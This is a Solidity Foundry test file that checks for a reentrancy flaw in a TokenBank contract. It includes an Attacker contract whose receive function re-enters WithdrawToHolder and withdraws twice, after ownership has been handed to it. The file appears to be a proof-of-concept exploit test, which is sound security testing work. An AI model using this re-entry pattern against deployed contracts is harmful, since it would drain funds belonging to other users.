
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1.1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have a deposit in the Holders mapping
        // We need to transfer ownership to allow WithdrawToHolder to be called
        
        // --- 3. Funding ---
        // Fund the contract under test
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the test contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Setup Attack ---
        // First, the attacker needs to deposit to have a balance in Holders
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Transfer ownership to the attacker contract so it can call WithdrawToHolder
        // The owner needs to call changeOwner, then the new owner confirms
        _contractUnderTest.changeOwner(address(_attacker));
        
        // Attacker confirms ownership
        vm.prank(address(_attacker));
        _contractUnderTest.confirmOwner();

        // --- 5. Trigger Attack ---
        _attacker.attack(attackVal);

        // --- 6. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit to create a balance in Holders mapping
        // The deposit function requires msg.value > MinDeposit (1 ether)
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        attackCallCount = 0;

        // 2. Call the vulnerable function
        // WithdrawToHolder is vulnerable because it calls external address before updating state
        victim.WithdrawToHolder(address(this), val);

        // 3. Verify Success Conditions
        // If we received more than we should have (due to reentrancy), the attack succeeded
        // The attack succeeds if attackCallCount > 1 (meaning we re-entered)
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    function confirmOwner() external {
        victim.confirmOwner();
    }

    receive() external payable {
        attackCallCount++;
        
        if (attackCallCount < 2) {
            // Re-enter the vulnerable function
            // The state hasn't been updated yet, so Holders[address(this)] still has the original value
            if (address(victim).balance >= storedAttackVal) {
                victim.WithdrawToHolder(address(this), storedAttackVal);
            }
        }
    }
}
